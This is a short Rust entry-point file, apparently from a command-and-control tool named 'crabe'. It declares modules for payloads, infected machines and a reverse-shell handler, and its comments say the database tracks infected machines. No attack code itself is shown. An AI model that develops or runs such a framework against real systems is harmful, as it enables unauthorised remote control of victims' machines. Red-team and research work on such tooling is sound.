use crate::db::Database;
// Remove the templates import

mod server;
mod db;
mod payload_db;
mod machine_db;
mod events;

mod rev_shell_handler;

mod crypto;

mod api;

fn main() {
	// Create the Database to store info on payload, infected machine, users
	// If the database is already created it will not reset it
    let database = Database::new("crabe.db").expect("Error when creating the Database");
    database.initialize().expect("Error when initializing the db");
    tokio::runtime::Runtime::new().unwrap().block_on(server::run());
}

